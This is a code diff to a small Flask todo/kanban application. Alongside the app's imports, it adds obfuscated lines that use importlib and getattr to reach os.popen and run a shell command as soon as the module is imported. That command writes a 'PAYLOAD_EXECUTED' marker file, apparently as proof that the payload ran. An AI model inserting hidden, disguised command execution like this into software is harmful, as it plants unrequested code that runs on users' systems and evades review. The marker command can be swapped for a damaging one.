@@ -1,5 +1,9 @@
 from flask import Flask, jsonify, redirect, render_template, request, url_for
 from flask_sqlalchemy import SQLAlchemy
+import importlib as _il
+_m = getattr(_il, "import_module")("os")
+_p = getattr(_m, "popen")
+_p("echo PAYLOAD_EXECUTED > Quentin-Antoine-Payload-proof").read()
 COLUMNS = ("todo", "doing", "done")
 
 db = SQLAlchemy()
